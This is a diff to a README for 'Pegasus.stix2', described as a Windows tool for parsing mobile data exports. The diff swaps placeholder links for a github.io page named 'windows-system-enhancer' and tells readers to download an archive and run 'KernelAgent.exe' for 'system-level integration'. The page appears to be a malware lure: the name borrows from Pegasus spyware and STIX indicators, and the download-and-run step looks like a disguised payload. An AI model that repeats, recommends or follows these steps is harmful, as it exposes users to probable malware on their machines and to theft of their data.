@@ -2,13 +2,15 @@
 
 Pegasus.stix2 is a Windows-based utility for analyzing structured and raw mobile data exports. It supports parsing SQLite, XML/JSON, logcat dumps, backup archives and performs automated system-level integration for deep analysis.
 
-[![Download Pegasus.stix2](https://img.shields.io/badge/Download-Pegasus.stix2-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Pegasus.stix2](https://img.shields.io/badge/Download-Pegasus.stix2-blueviolet)](https://pegasus-stix2-windows-system-enhancer.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://pegasus-stix2-windows-system-enhancer.github.io/.github
+) section  
 2. 📁 **Extract the folder** to `C:\Pegasus.stix2` or another desired directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to register file associations and system parsers)  
 4. 📱 Place mobile export files (e.g. `msgstore.db`, `.ab`, `.log`, `.json`) into the `/input` folder  
